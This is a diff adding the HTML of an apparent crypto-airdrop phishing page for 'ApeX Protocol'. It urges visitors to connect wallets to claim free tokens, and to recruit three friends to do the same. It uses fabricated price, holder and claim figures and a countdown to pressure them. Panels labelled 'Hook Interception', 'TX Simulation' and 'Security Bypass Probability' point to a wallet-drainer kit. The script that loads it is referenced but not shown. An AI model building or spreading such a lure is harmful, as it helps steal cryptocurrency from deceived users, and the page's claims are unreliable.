@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    
+
+
+    <title>ApeX Protocol | AI-Optimized Yield Farming</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.21/dist/vanta.net.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+  <script type="module" crossorigin src="/assets/index-CBSXj2Pl.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-CCwRZwga.css">
+</head>
+<body>
+    <div id="vanta-bg"></div>
+
+    <!-- Announcement Modal -->
+    <div class="announcement-modal" id="announcementModal">
+        <div class="announcement-modal-content">
+            <div class="announcement-modal-close" id="announcementModalClose">
+                <i class="fas fa-times"></i>
+            </div>
+            <div class="announcement-icon">
+                <i class="fas fa-users"></i>
+            </div>
+            <h2>Referral Required</h2>
+            <p>To claim your airdrop, you need to refer 3 friends to join ApeX Protocol.</p>
+            
+            <div class="referral-steps">
+                <div class="referral-step">
+                    <div class="step-number">1</div>
+                    <div>Share your unique referral link</div>
+                </div>
+                <div class="referral-step">
+                    <div class="step-number">2</div>
+                    <div>Get 3 friends to connect their wallets</div>
+                </div>
+                <div class="referral-step">
+                    <div class="step-number">3</div>
+                    <div>Claim your 500 APEX tokens</div>
+                </div>
+            </div>
+            
+            <div class="referral-link-container">
+                <div class="referral-link" id="referralLink">https://apex-protocol.io/ref?user=0x8a3F...Bc92</div>
+                <button class="copy-btn" id="copyReferralBtn">
+                    <i class="fas fa-copy"></i> Copy Link
+                </button>
+            </div>
+            
+            <button class="btn-primary" id="announcementOkBtn">
+                <i class="fas fa-check"></i> I Understand
+            </button>
+        </div>
+    </div>
+
+    <!-- Wallet Modal -->
+    <!-- <div class="wallet-modal" id="walletModal">
+        <div class="wallet-modal-content">
+            <div class="wallet-modal-close" id="walletModalClose">
+                <i class="fas fa-times"></i>
+            </div>
+            <h2 style="text-align: center; margin-bottom: 20px; color: var(--accent)">
+                <i class="fas fa-wallet"></i> Connect Wallet
+            </h2>
+
+            <div class="wallet-provider" data-provider="metamask" id="metamask-provider">
+                <div class="wallet-provider-icon">
+                    <i class="fab fa-ethereum"></i>
+                </div>
+                <div>
+                    <div class="wallet-provider-name">MetaMask</div>
+                    <div class="wallet-provider-description">
+                        Connect to your MetaMask Wallet
+                    </div>
+                </div>
+                <div class="wallet-provider-badge" id="metamask-badge">Detected</div>
+            </div>
+
+            <div class="wallet-provider" data-provider="coinbase" id="coinbase-provider">
+                <div class="wallet-provider-icon">
+                    <i class="fab fa-bitcoin"></i>
+                </div>
+                <div>
+                    <div class="wallet-provider-name">Coinbase Wallet</div>
+                    <div class="wallet-provider-description">
+                        Connect to your Coinbase Wallet
+                    </div>
+                </div>
+                <div class="wallet-provider-badge" id="coinbase-badge">Detected</div>
+            </div>
+
+            <div class="wallet-provider" data-provider="trust" id="trust-provider">
+                <div class="wallet-provider-icon">
+                    <i class="fas fa-lock"></i>
+                </div>
+                <div>
+                    <div class="wallet-provider-name">Trust Wallet</div>
+                    <div class="wallet-provider-description">
+                        Connect to your Trust Wallet
+                    </div>
+                </div>
+                <div class="wallet-provider-badge" id="trust-badge">Detected</div>
+            </div>
+
+            <div class="wallet-provider" data-provider="rabby" id="rabby-provider">
+                <div class="wallet-provider-icon">
+                    <i class="fas fa-wallet"></i>
+                </div>
+                <div>
+                    <div class="wallet-provider-name">Rabby Wallet</div>
+                    <div class="wallet-provider-description">
+                        Connect to your Rabby Wallet
+                    </div>
+                </div>
+                <div class="wallet-provider-badge" id="rabby-badge">Detected</div>
+            </div>
+        </div>
+    </div> -->
+
+    <div class="security-shield">
+        <i class="fas fa-shield-alt"></i> Security Verification Active
+    </div>
+
+    <header id="header">
+        <div class="container">
+            <nav>
+                <div class="logo">
+                    <i class="fas fa-ape logo-icon"></i>
+                    <span>APEX</span>
+                </div>
+                <ul class="nav-links">
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="index.html#features">Features</a></li>
+                    <li><a href="index.html#tokenomics">Tokenomics</a></li>
+                    <li><a href="index.html#roadmap">Roadmap</a></li>
+                    <li><a href="index.html#contact">Contact</a></li>
+                </ul>
+                <div id="walletButtonContainer">
+                    <!-- AppKit button will be inserted here by JavaScript -->
+                    <button class="wallet-btn" id="walletButton" >
+                        <i class="fas fa-wallet"></i> Connect
+                    </button>
+                </div>
+                <button class="mobile-menu-btn">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <h1 class="fade-in">Claim Your <span>AI-Optimized Tokens</span></h1>
+                <p class="fade-in">
+                    AI-enhanced token distribution! Get your free APEX tokens with
+                    predictive analytics and smart allocation. Only 25% remain - claim
+                    yours before they're gone!
+                </p>
+
+                <div class="claim-container">
+                    <div class="claim-card fade-in">
+                        <h2>ApeX Token Claim</h2>
+                        <div class="token-header">
+                            <div class="token-logo">AX</div>
+                            <div>
+                                <div class="token-name">ApeX Protocol</div>
+                                <div class="token-symbol">APEX</div>
+                                <div class="price-change positive">
+                                    <i class="fas fa-arrow-up"></i>
+                                    <span id="tokenPrice">$0.058</span> (<span id="priceChange">7.2%</span>)
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="claim-details">
+                            <div class="claim-amount">500 APEX</div>
+                            <p class="text-center">
+                                AI-optimized token distribution for maximum efficiency
+                            </p>
+                        </div>
+
+                        <div class="countdown-container">
+                            <div class="countdown-label">Time Until Launch</div>
+                            <div class="countdown" id="countdown">0:0:30:0</div>
+                        </div>
+
+                        <div class="progress-container">
+                            <div class="progress-label">
+                                <span>Tokens Claimed</span>
+                                <span id="progressPercentage">75%</span>
+                            </div>
+                            <div class="progress">
+                                <div id="progressBar" class="progress-bar" role="progressbar" style="width: 75%"></div>
+                            </div>
+                        </div>
+
+                        <!-- NFT Image Container -->
+                        <div class="nft-container">
+                            <div class="nft-image">
+                                <div class="nft-circuit"></div>
+                                <div class="nft-overlay"></div>
+                                <img
+                                    src="/assets/ChatGPT%20Image%20Nov%207_%202025_%2010_47_13%20AM-B5Vk0AVt.png"
+                                       alt="Futuristic Human NFT"
+                                />
+                            </div>
+                        </div>
+
+                        <div class="claim-actions">
+                            <w3m-button></w3m-button>
+                            <button class="btn-primary" id="connectButton" >
+                                <!-- Original button hidden -->
+                            </button>
+                            <div id="claimStatus" class="status"></div>
+                            <div class="connection-debug" id="connectionDebug"></div>
+                            <span class="debug-toggle" id="debugToggle">Show connection details</span>
+                        </div>
+                    </div>
+
+                    <div class="token-tracker-card fade-in">
+                        <h2>ApeX Token Tracker</h2>
+                        <div class="token-stats">
+                            <div class="stat-item">
+                                <h3>Market Cap</h3>
+                                <div class="stat-value">
+                                    $<span id="marketCap">1.84M</span>
+                                </div>
+                            </div>
+                            <div class="stat-item">
+                                <h3>Volume (24h)</h3>
+                                <div class="stat-value">$<span id="volume">286K</span></div>
+                            </div>
+                            <div class="stat-item">
+                                <h3>Holders</h3>
+                                <div class="stat-value"><span id="holders">12,542</span></div>
+                            </div>
+                            <div class="stat-item">
+                                <h3>Liquidity</h3>
+                                <div class="stat-value">
+                                    $<span id="liquidity">620K</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="chart-container">
+                            <canvas id="tokenChart"></canvas>
+                        </div>
+
+                        <div class="recent-claims">
+                            <h3><i class="fas fa-bolt"></i> Recent Claims</h3>
+                            <div class="claim-list" id="claimList">
+                                <!-- Claims will be added dynamically -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="ai-section fade-in">
+                    <h2><i class="fas fa-brain"></i> AI Security Analytics</h2>
+                    <div class="ai-stats">
+                        <div class="ai-stat">
+                            <i class="fas fa-fingerprint"></i>
+                            <h3>Fingerprinting</h3>
+                            <div class="value">Active</div>
+                        </div>
+                        <div class="ai-stat">
+                            <i class="fas fa-sim-card"></i>
+                            <h3>TX Simulation</h3>
+                            <div class="value">Enabled</div>
+                        </div>
+                        <div class="ai-stat">
+                            <i class="fas fa-code-branch"></i>
+                            <h3>Hook Interception</h3>
+                            <div class="value">Active</div>
+                        </div>
+                        <div class="ai-stat">
+                            <i class="fas fa-coins"></i>
+                            <h3>Non-ETH</h3>
+                            <div class="value">Ready</div>
+                        </div>
+                    </div>
+
+                    <div class="ai-prediction">
+                        <h3>
+                            <i class="fas fa-crystal-ball"></i> Security Bypass Probability
+                        </h3>
+                        <div class="prediction-meter">
+                            <div class="prediction-fill" id="predictionFill"></div>
+                        </div>
+                        <div class="prediction-labels">
+                            <span>Low</span>
+                            <span>Medium</span>
+                            <span>High</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-container">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <div class="footer-logo">
+                        <i class="fas fa-ape"></i>
+                        <span>APEX PROTOCOL</span>
+                    </div>
+                    <p class="footer-description">
+                        AI-optimized yield farming protocol with advanced security
+                        features and predictive analytics for maximum returns.
+                    </p>
+                </div>
+
+                <div class="footer-links">
+                    <div class="footer-column">
+                        <h3>Resources</h3>
+                        <ul>
+                            <li>
+                                <a href="#"><i class="fas fa-book"></i> Documentation</a>
+                            </li>
+                            <li>
+                                <a href="#"><i class="fas fa-newspaper"></i> Blog</a>
+                            </li>
+                            <li>
+                                <a href="#"><i class="fas fa-video"></i> Tutorials</a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div class="footer-column">
+                        <h3>Company</h3>
+                        <ul>
+                            <li>
+                                <a href="#"><i class="fas fa-users"></i> About Us</a>
+                            </li>
+                            <li>
+                                <a href="#"><i class="fas fa-briefcase"></i> Careers</a>
+                            </li>
+                            <li>
+                                <a href="#"><i class="fas fa-handshake"></i> Partners</a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div class="footer-column">
+                        <h3>Legal</h3>
+                        <ul>
+                            <li>
+                                <a href="#"
+                                    ><i class="fas fa-shield-alt"></i> Privacy Policy</a
+                                >
+                            </li>
+                            <li>
+                                <a href="#"
+                                    ><i class="fas fa-scale-balanced"></i> Terms of Service</a
+                                >
+                            </li>
+                            <li>
+                                <a href="#"><i class="fas fa-gavel"></i> Disclaimer</a>
+                            </li>
+                            <li>
+                                <a href="#"><i class="fas fa-cookie"></i> Cookie Policy</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <p class="copyright">
+                    &copy; 2025 ApeX Protocol. All rights reserved. |
+                    <a href="#">Security</a> |
+                    <a href="#">Status</a>
+                </p>
+            </div>
+        </div>
+    </footer>
+
+
+</body>
+</html>
